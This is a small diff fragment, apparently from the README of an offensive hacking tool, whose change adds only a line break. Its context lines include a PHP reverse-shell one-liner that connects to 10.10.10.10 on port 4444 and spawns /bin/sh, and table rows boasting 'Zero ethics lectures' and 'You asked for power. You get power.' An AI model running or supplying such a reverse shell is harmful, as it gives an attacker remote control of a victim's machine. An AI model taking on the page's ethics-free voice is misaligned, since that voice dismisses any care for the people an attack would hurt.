@@ -43,6 +43,8 @@ php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 | Zero ethics lectures                                      | You asked for power. You get power.                             |
 | Made by <span style="color:#00ff00;">wtf.mr</span>           | The guy who doesn’t read man pages — he burns them                 |
 
+ <br> 
+ 
 </div>
 
 
